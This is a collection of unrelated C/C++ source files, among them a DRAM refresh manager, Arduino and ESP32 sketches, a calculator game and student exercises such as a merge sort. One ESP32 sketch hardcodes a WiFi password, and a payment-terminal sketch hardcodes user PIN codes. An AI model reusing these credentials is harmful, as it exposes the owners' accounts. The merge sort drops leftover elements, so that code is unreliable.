    "#include <vector>\n\n#include \"base/base.h\"\n#include \"dram_controller/controller.h\"\n#include \"dram_controller/refresh.h\"\n\nnamespace Ramulator {\n\nclass AllBankRefresh : public IRefreshManager, public Implementation {\n  RAMULATOR_REGISTER_IMPLEMENTATION(IRefreshManager, AllBankRefresh, \"AllBank\", \"All-Bank Refresh scheme.\")\n  private:\n    Clk_t m_clk = 0;\n    IDRAM* m_dram;\n    IDRAMController* m_ctrl;\n\n    int m_dram_org_levels = -1;\n    int m_num_ranks = -1;\n\n    int m_nrefi = -1;\n    int m_ref_req_id = -1;\n    Clk_t m_next_refresh_cycle = -1;\n\n  public:\n    void init() override { \n      m_ctrl = cast_parent<IDRAMController>();\n    };\n\n    void setup(IFrontEnd* frontend, IMemorySystem* memory_system) override {\n      m_dram = m_ctrl->m_dram;\n\n      m_dram_org_levels = m_dram->m_levels.size();\n      m_num_ranks = m_dram->get_level_size(\"rank\");\n\n      m_nrefi = m_dram->m_timing_vals(\"nREFI\");\n      m_ref_req_id = m_dram->m_requests(\"all-bank-refresh\");\n\n      m_next_refresh_cycle = m_nrefi;\n    };\n\n    void tick() {\n      m_clk++;\n\n      if (m_clk == m_next_refresh_cycle) {\n        m_next_refresh_cycle += m_nrefi;\n        for (int r = 0; r < m_num_ranks; r++) {\n          std::vector<int> addr_vec(m_dram_org_levels, -1);\n          addr_vec[0] = m_ctrl->m_channel_id;\n          addr_vec[1] = r;\n          Request req(addr_vec, m_ref_req_id);\n\n          bool is_success = m_ctrl->priority_send(req);\n          if (!is_success) {\n            throw std::runtime_error(\"Failed to send refresh!\");\n          }\n        }\n      }\n    };\n\n};\n\n}       // namespace Ramulator\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"random\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n\n\nusing namespace std;\n\nconst int dimensioneMax=100;\n\n//prototipi\nint caricaVettore(int numeri[]);\nfloat media(int n, int num[]);\nvoid stampaMedia(float m);\nvoid visualizza(int n, int num[]);\nvoid MaggioreEMinore(int n, int num[]);\nvoid ordinamento(int n, int v[]);\nvoid ricercaParziale(int n, int v[]);\nvoid ricercaTotale(int n, int v[]);\nint Menu();\n\n\nint main() {\n    \n    int n;\n    float m=0.00;\n    int scelta;\n    int numeri[dimensioneMax];\n    \n    n=caricaVettore(numeri);\n    \n    do {\n        scelta=Menu();\n        switch(scelta) {\n            case 1:\n                m=media(n, numeri);\n                stampaMedia(m);\n            break;\n            case 2:\n                visualizza(n, numeri);\n            break;\n            case 3:\n                MaggioreEMinore(n, numeri);\n            break;\n            case 4:\n                ordinamento(n, numeri);\n            break;\n            case 5:\n                ricercaParziale(n, numeri);\n            break;\n            case 6:\n                ricercaTotale(n, numeri);\n            break;\n            case 0:\n                cout<<\"Esci\"<<endl;\n            break;\n            default:\n                cout<<\"Attenzione, scelta sbagliata!\"<<endl;\n            break;\n        }\n    }while(scelta!=0);\n    \n    return 0;\n}\n\nint Menu() {\n  int scegli;\n  cout<<\"-----------------MENU-----------------\"<<endl;\n  cout<<\"1-Stampa media\"<<endl;\n  cout<<\"2-Stampa vettore\"<<endl;\n  cout<<\"3-Visualizza maggiore e minore\"<<endl;\n  cout<<\"4-Ordina vettore\"<<endl;\n  cout<<\"5-Ricerca parziale\"<<endl;\n  cout<<\"6-Ricerca totale\"<<endl;\n  cout<<\"0-Fine\"<<endl;\n  cout<<\"Scegli un operazione: \"<<endl;\n  cin>>scegli;\n\n  return scegli;\n}\n\nint caricaVettore(int numeri[]) {\n    \n    int i=0;\n    char risp;\n    \n    do {\n        cout<<\"Inserisci un elemento: \";\n        cin>>numeri[i];\n        cout<<\"Vuoi inserire un altro elemento ? (S/N): \";\n        cin>>risp;\n        i++;\n    }while(risp=='s'||risp=='S');\n    \n    return i;\n    \n}\n\nfloat media(int n, int num[]) {\n    \n    float m=0.00;\n    float s=0.00;\n    \n    for(int i=0; i<n; i++) {\n        s=s+num[i];\n    }\n    \n    m=s/n;\n    \n    return m;\n    \n}\n\nvoid stampaMedia(float m) {\n    cout<<\"La media degli elementi del vettore e' : \"<<m<<endl;\n}\n\n\nvoid visualizza(int n, int num[]) {\n    \n    cout<<\"Gli elementi del vettore sono: \"<<endl;\n    \n    cout<<endl;\n    \n    for(int i=0; i<n; i++) {\n        cout<<num[i]<<endl;\n    }\n    \n    cout<<endl;\n    \n}\n\n\nvoid MaggioreEMinore(int n, int num[]) {\n    \n    int max=num[0];\n    int min=num[0];\n    \n    for(int i=0; i<n; i++) {\n        if(num[i]>max) {\n            max=num[i];\n        }\n        \n        if(num[i]<min) {\n            min=num[i];\n        }\n        \n    }\n    \n    cout<<\"Il valore maggiore nel vettore e' : \"<<max<<endl;\n    cout<<\"Il valore minore nel vettore e' : \"<<min<<endl;\n    \n    \n}\n\n\nvoid ordinamento(int n, int v[]) {\n    \n    int temp;\n    \n    for(int i=0;i<n-1;i++) {\n        for(int j=i+1;j<n;j++) {\n            if(v[i]>v[j]) {\n                temp=v[i];\n                v[i]=v[j];\n                v[j]=temp;\n            }\n        }\n    }\n    \n    cout<<\"Il vettore ordinato e' : \"<<endl;\n    visualizza(n, v);\n    \n    \n}\n\n\nvoid ricercaParziale(int n, int v[]) {\n    int numero;\n    int i=0;\n    \n    \n    cout<<endl;\n    \n    cout<<\"Inserisci il numero da cercare: \";\n    cin>>numero;\n    while(i<n&&v[i]!=numero) {\n        i=i+1;\n    }\n    \n    if(i>=n) {\n        cout<<numero<<\" non e' presente nel vettore\"<<endl;\n    } else {\n        cout<<numero<<\" e' presente nel vettore e si trova in \"<<i+1<<\"\u00b0 posizione\"<<endl;\n\n    }\n    \n    cout<<endl;\n}\n\n\n\nvoid ricercaTotale(int n, int v[]) {\n    \n    int numero;\n\n    \n    cout<<endl;\n    \n    cout<<\"Inserisci il numero da ricercare: \";\n    cin>>numero;\n    \n    cout<<endl;\n    \n    for(int i=0; i<n; i++) {\n        if(v[i]==numero) {\n            cout<<\"Dato trovato: \"<<v[i]<<endl;\n        }\n    }\n    \n    cout<<endl;\n    \n}\n",
    "#include \"bird.hpp\"\r\n\r\nBird::Bird(int x, int y)\r\n{\r\n    this->x = x;\r\n    this->y = y;\r\n    vy = 0;\r\n    oldx = x;\r\n    oldy = y;\r\n    originalx = x;\r\n    originaly = y;\r\n\r\n    hitPipe = false;\r\n    scored = false;\r\n    \r\n    currentSprite = bird_1;\r\n\r\n    //Create the sprite that will hold the background.\r\n    behindBird = gfx_MallocSprite(bird_0_width, bird_0_height);\r\n\r\n    //Assign the sprite.\r\n    gfx_GetSprite(behindBird, x, y);\r\n\r\n    //Jump once so that the bird won't fall down before the player is able to react.\r\n    Jump();\r\n}\r\n\r\nvoid Bird::PreDraw()\r\n{\r\n    //Get the background behind the sprite's old position.\r\n    gfx_GetSprite(behindBird, oldx, oldy);\r\n}\r\n\r\nvoid Bird::Draw(bool animate)\r\n{\r\n    //Only animate the sprite when it should animate.\r\n    if (animate)\r\n        currentSprite = GetSpriteToDraw();\r\n    //Draw the sprite.\r\n    gfx_RLETSprite(currentSprite, x, y);\r\n}\r\n\r\nvoid Bird::Cleanup()\r\n{\r\n    //Draw the background over the old sprite on the buffer.\r\n    gfx_Sprite(behindBird, oldx, oldy);\r\n\r\n    //Set the old position as the current/new position.\r\n    oldx = x;\r\n    oldy = y;\r\n}\r\n\r\nvoid Bird::Move()\r\n{\r\n    static bool key;\r\n    static bool prevkey;\r\n\r\n    key = (kb_Data[7] & kb_Up);\r\n    if (key && !prevkey)\r\n        Jump();\r\n    else\r\n        DecreaseJumpVelocity();\r\n\r\n    //Take care of forces.\r\n    y += hitPipe ? GRAVITY : GRAVITY + vy;\r\n    \r\n    prevkey = key;\r\n}\r\n\r\nvoid Bird::Idle()\r\n{\r\n    //indicates if the bird is going up.\r\n    static bool isGoingUp = true;\r\n    //The offset on the y-axis relative to the original y.\r\n    static float offset = 0;\r\n    \r\n    //Check if we should change directions and change directions when needed.\r\n    if (y <= (originaly - (bird_0_height / 4)))\r\n        isGoingUp = false;\r\n    if(y >= (originaly + (bird_0_height / 4)))\r\n        isGoingUp = true;\r\n\r\n    //If the bird should go up, we move it up, if it should go down, we move it down.\r\n    if (isGoingUp)\r\n        offset -= BIRD_IDLE_MOVE_SPEED;\r\n    if (!isGoingUp)\r\n        offset += BIRD_IDLE_MOVE_SPEED;\r\n\r\n    //Apply the offset\r\n    y = originaly + (int)offset; \r\n}\r\n\r\nbool Bird::IsAlive()\r\n{\r\n    //If the bird touches the ground, it dies.\r\n    if(y >= LCD_HEIGHT - bird_0_height - ground_0_height)\r\n        return false;\r\n    else\r\n        return true;\r\n}\r\n\r\nvoid Bird::HandlePipes(PipePair** pipes, ScoreCounter* score)\r\n{\r\n    //If we have already hit a pipe, we won't check another time.\r\n    if (hitPipe)\r\n        return;\r\n\r\n    //Check for collisions with the pipes.\r\n    for (int i = 0; i < PIPE_AMOUNT; i++)\r\n    {\r\n        //Check if the bird is in between the two pipes on the x-axis or touches one of them on the x-axis.\r\n        if (((x + bird_0_width >= pipes[i]->upperx) && (x + bird_0_width <= pipes[i]->upperx + pipe_width)) || ((x >= pipes[i]->upperx) && (x <= pipes[i]->upperx + pipe_width)))\r\n        {\r\n            //Check if the bird is in the upper pipe or touches it.\r\n            if (y <= pipes[i]->uppery + pipe_height)\r\n                hitPipe = true;\r\n            \r\n            //Check if the bird is in the lower pipe or touches it.\r\n            if (y + bird_0_height >= pipes[i]->lowery)\r\n                hitPipe = true;\r\n        }\r\n\r\n        //If the bird is in between the two pipes and we haven't scored recently.\r\n        if ((x >= pipes[i]->upperx) && (x <= pipes[i]->upperx + pipe_width) && (!scored))\r\n        {\r\n            scored = true;\r\n            score->IncreaseScore();\r\n        }\r\n\r\n        //If we have scored recently and we aren't in between the pipes anymore, we'll we able to score again.\r\n        if ((x > pipes[i]->upperx + pipe_width) && (scored))\r\n            scored = false;\r\n        \r\n    }\r\n}\r\n\r\nvoid Bird::Reset()\r\n{\r\n    x = originalx;\r\n    y = originaly;\r\n    vy = 0;\r\n    currentSprite = bird_1;\r\n    hitPipe = false;\r\n    scored = false;\r\n    Jump();\r\n}\r\n\r\ngfx_rletsprite_t* Bird::GetSpriteToDraw()\r\n{\r\n    //If the bird is dead or it has hit a pipe, it won't animate anymore.\r\n    if (!IsAlive() || hitPipe)\r\n        return bird_1;\r\n    \r\n    static int spriteIndex = 0;\r\n    //Increase the spriteIndex everytime this method is ran.\r\n    spriteIndex++;\r\n\r\n    //If spriteIndex is a multiple of BIRD_ANIMATION_SPEED, this will only be true once every BIRD_ANIMATION_SPEED time(s).\r\n    if ((spriteIndex % BIRD_ANIMATION_SPEED) == 0)\r\n    {\r\n        int relativeSpriteIndex = (spriteIndex / BIRD_ANIMATION_SPEED);\r\n\r\n        //If we divide spriteIndex by BIRD_ANIMATION_SPEED we get the number of times we have entered this if clause.\r\n        if (relativeSpriteIndex % 2 == 0)\r\n            return bird_1;\r\n\r\n        else if(relativeSpriteIndex % 3 == 0)\r\n            return bird_2;\r\n\r\n        else if(relativeSpriteIndex % 1 == 0)\r\n            return bird_0;\r\n\r\n        else\r\n            return currentSprite;\r\n    }\r\n\r\n    //If it isn't time yet to switch keyframes we will return the current sprite.\r\n    else\r\n        return currentSprite;\r\n}\r\n\r\nvoid Bird::Jump()\r\n{\r\n    //Never ",
    "#include <Arduino.h>\n#include <WiFi.h>\n#include <WiFiClient.h>\n#include \"IcsHardSerialClass.h\"\n#include \"pinassign.h\"\n\n#define BAUDRATE 115200\n#define TIMEOUT 1000\n\n#define INTERVAL 20\n\nWiFiClient client;\nconst char* ssid = \"hibiki\";\nconst char* password = \"Maruh1b1k1\";\nconst char* serverIP = \"172.20.10.4\";\nconst int serverPort = 12345;\n\nIcsHardSerialClass krs1(&Serial,  MYEN1, BAUDRATE, TIMEOUT, MYRX1, MYTX1);\nIcsHardSerialClass krs2(&Serial1, MYEN2, BAUDRATE, TIMEOUT, MYRX2, MYTX2);\n\n// deg -135 - 135\nint dir1 = 1;\nint dir2 = 1;\nint next1, next2;\nint now1, now2;\n\nvoid setup() {\n  Serial.begin(115200);\n  krs1.begin();\n  krs2.begin();\n  Serial.println(\"program started\");\n\n  now1 = krs1.setPos(1, 7500);\n  now2 = krs2.setPos(1, 7500);\n  delay(500);\n  next1 = now1; next2 = now2;\n}\n\nstatic long currentMillis;\nstatic long prevMillis = 0;\n\n// deg / sec\nfloat sp1 = 45;\nfloat sp2 = 400;\nvoid speed_control(){\n  currentMillis = millis();\n  if (currentMillis - prevMillis > INTERVAL){\n    // now1 = krs1.getPos(1); now2 = krs2.getPos(1);\n    next1 = next1 + dir1 * sp1 * INTERVAL * 8 / 270;\n    next2 = next2 + dir2 * sp2 * INTERVAL * 8 / 270;\n\n    if (next1 > 11000 or next1 < 4000){dir1 *= -1;}\n    if (next2 > 11000 or next2 < 4000){dir2 *= -1;}\n\n    now1 = krs1.setPos(1, (int)next1);\n    now2 = krs2.setPos(1, (int)next2);\n    prevMillis = currentMillis;\n  }\n}\n\nvoid loop() {\n  speed_control();\n}\n",
    "struct ll{\n    int num;\n    ll* next;\n    ll(){\n        num = -1;\n        next = nullptr;\n    }\n};\n\nclass CustomStack {\nint totsize;\nint op = 0;\nll *results = new ll();\nll* beg = results;\npublic:\n    CustomStack(int maxSize) {\n        totsize = maxSize;\n    }\n    \n    void push(int x) {\n        if(op<totsize){\n            ll* novo = new ll();\n            novo->num = x;\n            novo->next = results;\n            results = novo;\n            op++;\n        }\n    }\n    \n    int pop() {\n        if(op>0){\n        int res = results->num;\n        results = results->next;\n        op--;\n        return res;\n        }\n        else{\n            return results->num;\n        }\n    }\n    \n    void increment(int k, int val) {\n        int i = 0;\n        ll* incr = results;\n        int offset = op - k;\n        while(i<offset){\n            incr = incr->next;\n            i++;\n        }\n        while(incr->next != nullptr){\n            incr->num = incr->num + val;\n            incr = incr->next;\n        }\n    }\n};",
    "/*\n * Copyright (c) 2010 by Cristian Maglie <c.maglie@arduino.cc>\n * Copyright (c) 2014 by Paul Stoffregen <paul@pjrc.com> (Transaction API)\n * Copyright (c) 2014 by Matthijs Kooijman <matthijs@stdin.nl> (SPISettings AVR)\n * Copyright (c) 2014 by Andrew J. Kroll <xxxajk@gmail.com> (atomicity fixes)\n * SPI Master library for arduino.\n *\n * This file is free software; you can redistribute it and/or modify\n * it under the terms of either the GNU General Public License version 2\n * or the GNU Lesser General Public License version 2.1, both as\n * published by the Free Software Foundation.\n */\n\n#include \"SPI.h\"\n\nSPIClass SPI;\n\nuint8_t SPIClass::initialized = 0;\nuint8_t SPIClass::interruptMode = 0;\nuint8_t SPIClass::interruptMask = 0;\nuint8_t SPIClass::interruptSave = 0;\n#ifdef SPI_TRANSACTION_MISMATCH_LED\nuint8_t SPIClass::inTransactionFlag = 0;\n#endif\n\nvoid SPIClass::begin()\n{\n  uint8_t sreg = SREG;\n  noInterrupts(); // Protect from a scheduler and prevent transactionBegin\n  if (!initialized) {\n    // Set SS to high so a connected chip will be \"deselected\" by default\n    uint8_t port = digitalPinToPort(SS);\n    uint8_t bit = digitalPinToBitMask(SS);\n    volatile uint8_t *reg = portModeRegister(port);\n\n    // if the SS pin is not already configured as an output\n    // then set it high (to enable the internal pull-up resistor)\n    if(!(*reg & bit)){\n      digitalWrite(SS, HIGH);\n    }\n\n    // When the SS pin is set as OUTPUT, it can be used as\n    // a general purpose output port (it doesn't influence\n    // SPI operations).\n    pinMode(SS, OUTPUT);\n\n    // Warning: if the SS pin ever becomes a LOW INPUT then SPI\n    // automatically switches to Slave, so the data direction of\n    // the SS pin MUST be kept as OUTPUT.\n    SPCR |= _BV(MSTR);\n    SPCR |= _BV(SPE);\n\n    // Set direction register for SCK and MOSI pin.\n    // MISO pin automatically overrides to INPUT.\n    // By doing this AFTER enabling SPI, we avoid accidentally\n    // clocking in a single bit since the lines go directly\n    // from \"input\" to SPI control.\n    // http://code.google.com/p/arduino/issues/detail?id=888\n    pinMode(SCK, OUTPUT);\n    pinMode(MOSI, OUTPUT);\n  }\n  initialized++; // reference count\n  SREG = sreg;\n}\n\nvoid SPIClass::end() {\n  uint8_t sreg = SREG;\n  noInterrupts(); // Protect from a scheduler and prevent transactionBegin\n  // Decrease the reference counter\n  if (initialized)\n    initialized--;\n  // If there are no more references disable SPI\n  if (!initialized) {\n    SPCR &= ~_BV(SPE);\n    interruptMode = 0;\n    #ifdef SPI_TRANSACTION_MISMATCH_LED\n    inTransactionFlag = 0;\n    #endif\n  }\n  SREG = sreg;\n}\n\n// mapping of interrupt numbers to bits within SPI_AVR_EIMSK\n#if defined(__AVR_ATmega32U4__)\n  #define SPI_INT0_MASK  (1<<INT0)\n  #define SPI_INT1_MASK  (1<<INT1)\n  #define SPI_INT2_MASK  (1<<INT2)\n  #define SPI_INT3_MASK  (1<<INT3)\n  #define SPI_INT4_MASK  (1<<INT6)\n#elif defined(__AVR_AT90USB646__) || defined(__AVR_AT90USB1286__)\n  #define SPI_INT0_MASK  (1<<INT0)\n  #define SPI_INT1_MASK  (1<<INT1)\n  #define SPI_INT2_MASK  (1<<INT2)\n  #define SPI_INT3_MASK  (1<<INT3)\n  #define SPI_INT4_MASK  (1<<INT4)\n  #define SPI_INT5_MASK  (1<<INT5)\n  #define SPI_INT6_MASK  (1<<INT6)\n  #define SPI_INT7_MASK  (1<<INT7)\n#elif defined(EICRA) && defined(EICRB) && defined(EIMSK)\n  #define SPI_INT0_MASK  (1<<INT4)\n  #define SPI_INT1_MASK  (1<<INT5)\n  #define SPI_INT2_MASK  (1<<INT0)\n  #define SPI_INT3_MASK  (1<<INT1)\n  #define SPI_INT4_MASK  (1<<INT2)\n  #define SPI_INT5_MASK  (1<<INT3)\n  #define SPI_INT6_MASK  (1<<INT6)\n  #define SPI_INT7_MASK  (1<<INT7)\n#else\n  #ifdef INT0\n  #define SPI_INT0_MASK  (1<<INT0)\n  #endif\n  #ifdef INT1\n  #define SPI_INT1_MASK  (1<<INT1)\n  #endif\n  #ifdef INT2\n  #define SPI_INT2_MASK  (1<<INT2)\n  #endif\n#endif\n\nvoid SPIClass::usingInterrupt(uint8_t interruptNumber)\n{\n  uint8_t mask = 0;\n  uint8_t sreg = SREG;\n  noInterrupts(); // Protect from a scheduler and prevent transactionBegin\n  switch (interruptNumber) {\n  #ifdef SPI_INT0_MASK\n  case 0: mask = SPI_INT0_MASK; break;\n  #endif\n  #ifdef SPI_INT1_MASK\n  case 1: mask = SPI_INT1_MASK; break;\n  #endif\n  #ifdef SPI_INT2_MASK\n  case 2: mask = SPI_INT2_MASK; break;\n  #endif\n  #ifdef SPI_INT3_MASK\n  case 3: mask = SPI_INT3_MASK; break;\n  #endif\n  #ifdef SPI_INT4_MASK\n  case 4: mask = SPI_INT4_MASK; break;\n  #endif\n  #ifdef SPI_INT5_MASK\n  case 5: mask = SPI_INT5_MASK; break;\n  #endif\n  #ifdef SPI_INT6_MASK\n  case 6: mask = SPI_INT6_MASK; break;\n  #endif\n  #ifdef SPI_INT7_MASK\n  case 7: mask = SPI_INT7_MASK; break;\n  #endif\n  default:\n    interruptMode = 2;\n    break;\n  }\n  interruptMask |= mask;\n  if (!interruptMode)\n    interruptMode = 1;\n  SREG = sreg;\n}\n\nvoid SPIClass::notUsingInterrupt(uint8_t interruptNumber)\n{\n  // Once in mode 2 we can't go back to 0 without a proper reference count\n  if (interruptMode == 2)\n    return;\n  uint8_t mask = 0;\n  uint8_t sreg = SREG;\n  noInterrupts(); // Protect from a scheduler and prevent transactionBegin\n  switch (interruptNumber) {\n",
    "#include <Arduino.h>\n#include <LiquidCrystal_I2C.h>\n#include <Wire.h>\n#include <WiFi.h>\n#include <SPI.h>\n#include <MFRC522.h>\n#include <PubSubClient.h>\n#include <Keypad.h>\n#include <Keypad_I2C.h>\n#include \"Adafruit_Thermal.h\"\n\n#define NOTE_A5  880\n\n#define SS_PIN  5  // ESP32 pin GPIO5 \n#define RST_PIN 27 // ESP32 pin GPIO27 \n#define MSG_BUFFER_SIZE\t(50)\n#define I2CADDR  0x20\n#define RXD2 16\n#define TXD2 17\n\nchar msg[MSG_BUFFER_SIZE];\nint value = 0;\nfloat price;\nint step = 0;\nfloat wifiw = 0;\nunsigned long lastMsg = 0;\nconst char* mqtt_server = \"test.mosquitto.org\";\nbool scan = false;\nconst int buzzer = 4;\n\nString tags[] = {\"036d7994\", \"4375d194\", \"437abe94\", \"\", \"3172ce2d\"};\n\nconst char* ssid = \"\";\nconst char* password = \"\";\n\nchar customKey;\nint numbers = 0;\nint user;\nbool correct;\n\n\n\nconst char PINLENGTH = 4;\nchar keyBuffer[PINLENGTH+1] = {'-','-','-','-'};\nchar pinCode0[PINLENGTH+1] = {'0','2','2','6'};\nchar pinCode1[PINLENGTH+1] = {'7','2','6','9'};\nchar pinCode2[PINLENGTH+1] = {'2','8','1','4'};\nchar pinCode3[PINLENGTH+1] = {'1','4','4','7'};\nchar pinCode4[PINLENGTH+1] = {'8','4','7','6'};\n\n\nAdafruit_Thermal printer(&Serial2);\nLiquidCrystal_I2C lcd(0x27, 20, 4);\nWiFiClient espClient;\nMFRC522 rfid(SS_PIN, RST_PIN);\nPubSubClient client(espClient);\nconst byte ROWS = 4; //four rows\nconst byte COLS = 4; //four columns\n//define the cymbols on the buttons of the keypads\nchar hexaKeys[ROWS][COLS] = {\n  {'D','#','0','*'},\n  {'C','9','8','7'},\n  {'B','6','5','4'},\n  {'A','3','2','1'}\n};\nbyte rowPins[ROWS] = {3, 2, 1, 0}; //connect to the row pinouts of the keypad\nbyte colPins[COLS] = {7, 6, 5, 4}; //connect to the column pinouts of the keypad\n\n//initialize an instance of class NewKeypad\nKeypad_I2C customKeypad( makeKeymap(hexaKeys), rowPins, colPins, ROWS, COLS, I2CADDR); \n\n\nString readHex(byte *buffer, byte bufferSize) {\n  String result = \"\";\n  for (byte i = 0; i < bufferSize; i++) {\n    String* hex[] = {};\n    result = result + String(buffer[i] < 0x10 ? \" 0\" : \"\");\n    result = result + String(buffer[i], HEX);\n  }\n  return result;\n}\n\nvoid reconnect() {\n  // Loop until we're reconnected\n  while (!client.connected()) {\n    Serial.print(\"Attempting MQTT connection...\");\n    // Create a random client ID\n    String clientId = \"ESP32+jajhfglkjhdslkjghaldfkjvklJSDH$ZU\u00a7U\";\n    // Attempt to connect\n    if (client.connect(clientId.c_str())) {\n      Serial.println(\"connected\");\n      // Once connected, publish an announcement...\n      client.publish(\"kartengeraet2\", \"connected\");\n      // ... and resubscribe\n      client.subscribe(\"kartengeraet\");\n    } else {\n      Serial.print(\"failed, rc=\");\n      Serial.print(client.state());\n      Serial.println(\" try again in 5 seconds\");\n      // Wait 5 seconds before retrying\n      delay(5000);\n    }\n  }\n}\n\nvoid setupWifi() {\n  pinMode(26, OUTPUT);\n  // Serial.println(\"scan start\");\n\n  // // WiFi.scanNetworks will return the number of networks found\n  // int n = WiFi.scanNetworks();\n  // Serial.println(\"scan done\");\n  // if (n == 0) {\n  //     Serial.println(\"no networks found\");\n  // } else {\n  //   Serial.print(n);\n  //   Serial.println(\" networks found\");\n  //   for (int i = 0; i < n; ++i) {\n  //     // Print SSID and RSSI for each network found\n  //     Serial.print(i + 1);\n  //     Serial.print(\": \");\n  //     Serial.print(WiFi.SSID(i));\n  //     Serial.print(\" (\");\n  //     Serial.print(WiFi.RSSI(i));\n  //     Serial.print(\")\");\n  //     Serial.println((WiFi.encryptionType(i) == WIFI_AUTH_OPEN)?\" \":\"*\");\n  //     delay(10);\n  //   }\n  // }\n  WiFi.disconnect();\n  Serial.println(\"\");\n  lcd.clear();\n  lcd.print(\"Zum WLAN verbinden:\");\n  lcd.setCursor(0,1);\n  // We start by connecting to a WiFi network\n  lcd.print(ssid);\n  Serial.println();\n  Serial.println(\"Connecting to \");\n  Serial.print(ssid);\n  WiFi.mode(WIFI_STA);\n  WiFi.begin(ssid, password);\n  lcd.setCursor(0,2);\n\n  while (WiFi.status() != WL_CONNECTED) {\n    delay(500);\n    Serial.print(\".\");\n    lcd.print(\".\");\n  }\n\n  lcd.clear();\n  lcd.print(\"WLAN verbunden\");\n  lcd.setCursor(0,1);\n  lcd.print(\"IP-Adresse: \");\n  lcd.setCursor(0,2);\n  lcd.println(WiFi.localIP());\n  delay(2000);\n}\n\nvoid callback(char* topic, byte* payload, unsigned int length) {\n  Serial.print(\"Message arrived [\");\n  Serial.print(topic);\n  Serial.print(\"] \");\n  String message;\n  for (int i = 0; i < length; i++) {\n    Serial.print((char)payload[i]);\n    message += (char)payload[i];\n  }\n  Serial.println();\n  Serial.println(message);\n  if(step == 0 && message == \"open\"){\n    digitalWrite(26, HIGH);\n    delay(1000);\n    digitalWrite(26, LOW);\n  }\n  if(step == 0 && message == \"new\"){\n    step = 1;\n    lcd.clear();\n    lcd.print(\"Neuer Auftrag\");\n    lcd.setCursor(0,1);\n    lcd.print(\"Betrag: \");\n  }else if(step == 1){\n    price = message.toFloat();\n    lcd.print(price);\n    step = 2;\n    scan = true;\n    delay(1000);\n    lcd.setCursor(0, 2);\n    lcd.print(\"Auf Karte Warten...\");\n    lcd.setCursor(0, 1);\n  }else if(step == 0 && message == \"print\"){\n    step",
    "#include <iostream>\nusing namespace std;\nint main(void)\n{\n     // array practice (first time)\n     //  store same type of datatype , memeory wastage\n     //  two types , (a)1-D Array (b)2-D Array\n\n     //  (a)1-D Array,\n\n     //  Q1) printing all elements\n     //  int array[]={10,-2,45,56,-3,0};\n     //  cout<<\"Printing Program of Array\"<<endl;\n     //  for(int i=0;i<sizeof(array)/sizeof(array[0]);i++)\n     //  {\n     //      cout<<array[i]<<\" \";\n     //  }\n\n     //  Q2)Linear Search in an Array\n     // first by function\n     int array[] = {20, 30, 50, -2, 60};\n     int flag;\n     cin >> flag;\n     int size = sizeof(array) / sizeof(array[0]);\n     // bool linearSearch(int c[],int v,int p);\n     // if(linearSearch(array,size,flag))\n     // {\n     //      cout<<\"Present\";\n     // }\n     // else{\n     //      cout<<\"Not Present\";\n     // }\n     // in program itself\n     // bool ans = false;\n     // for (int i = 0; i < size; i++)\n     // {\n     //      if (array[i] == flag)\n     //      {\n     //           // cout<<\"Mil gaya bhai\"<< endl;\n     //           ans = true;\n     //           break;\n     //      }\n     // }\n     // if (ans)\n     // {\n     //      cout << \"Mil Gaya\";\n     // }\n     // else\n     // {\n     //      cout << \"Nahi Mils\";\n     // }\n\n     //Q3) Maximum Number in an Array\n      \n\n     return 0;\n}\n\nbool linearSearch(int a[], int size, int flag)\n{\n     for (int i = 0; i < size; i++)\n     {\n          if (a[i] == flag)\n          {\n               return true;\n               break;\n          }\n     }\n     return false;\n}\n\n// bool linearSearch(int b[],int size,int flag)\n// {\n//      for(int i=0;i<size;i++)\n//      {\n//           if(b[i]!=flag)\n//           {\n//                return false;\n//           }\n//      }\n//      return true;\n// }",
    "#include <iostream>\n#include <vector>\nusing namespace std;\n\nvoid merge(vector<int>& left, vector<int>& right, vector<int>& array){\n    int leftSize = left.size();\n    int rightSize = right.size();\n\n    //indices for left, right and main array\n    int i = 0, l = 0, r = 0;\n\n    while (l < leftSize && r < rightSize){\n        if (left[l] < right[r]){\n            array[i] = left[l];\n            l++;\n        }\n        else{\n            array[i] = right[r];\n            r++;\n        }\n        i++;\n    }\n\n    while (l < leftSize){\n        array[i] = left[l];\n        l++;\n        i++;\n    }\n}\n\nvoid mergeSort(vector<int>& array){\n    int n= array.size();\n    if(n<=1){\n        return;\n    }\n    int center = n/2;\n\n    vector<int> left(center);\n    vector<int> right(n-center);\n\n    for (int i = 0; i < n; i++){\n        if (i < center){\n            left[i] = array[i];\n        }\n        else{\n            right[i-center] = array[i];\n        }\n    }\n    //divide the array into two parts\n    mergeSort(left);\n    mergeSort(right);\n\n    merge(left, right, array);\n}\n\nint main(){\n    vector <int> array = { 89, 90, 100, 12, 69, 54, 23, 34, 45, 56, 67, 78};\n\n    mergeSort(array);\n    for (int i = 0; i < array.size(); i++){\n        cout << array[i] << \" \";\n    }\n}",
